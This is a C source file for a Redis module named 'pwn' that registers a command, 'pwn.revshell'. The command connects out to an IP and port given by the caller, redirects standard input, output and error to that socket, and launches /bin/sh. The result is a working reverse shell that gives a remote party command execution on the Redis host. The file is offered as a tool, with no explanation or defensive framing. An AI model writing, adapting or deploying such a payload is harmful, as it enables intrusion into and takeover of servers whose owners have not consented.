#include "redismodule.h"
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h> 

int ReverseShell(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (argc != 3) {
        return RedisModule_WrongArity(ctx);
    }
    
    struct sockaddr_in serv_addr;

    size_t len;
    RedisModule_StringPtrLen(argv[2], &len);

	serv_addr.sin_family = AF_INET; 
    serv_addr.sin_port = htons(atoi(RedisModule_StringPtrLen(argv[2], &len))); 

	inet_pton(AF_INET, RedisModule_StringPtrLen(argv[1], &len), &serv_addr.sin_addr);


    int sock = socket(AF_INET, SOCK_STREAM, 0);
    
    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        RedisModule_ReplyWithSimpleString(ctx, "ERR");
        return REDISMODULE_ERR;
    }

    if (fork() == 0) {
    
        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);

        system("/bin/sh");
    }

    RedisModule_ReplyWithSimpleString(ctx, "OK");

    return REDISMODULE_OK;
}

int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (RedisModule_Init(ctx,"pwn",1,REDISMODULE_APIVER_1)
        == REDISMODULE_ERR) return REDISMODULE_ERR;

    if (RedisModule_CreateCommand(ctx,"pwn.revshell",
        ReverseShell, "readonly",
        0, 0, 0) == REDISMODULE_ERR)
        return REDISMODULE_ERR;

    return REDISMODULE_OK;
}
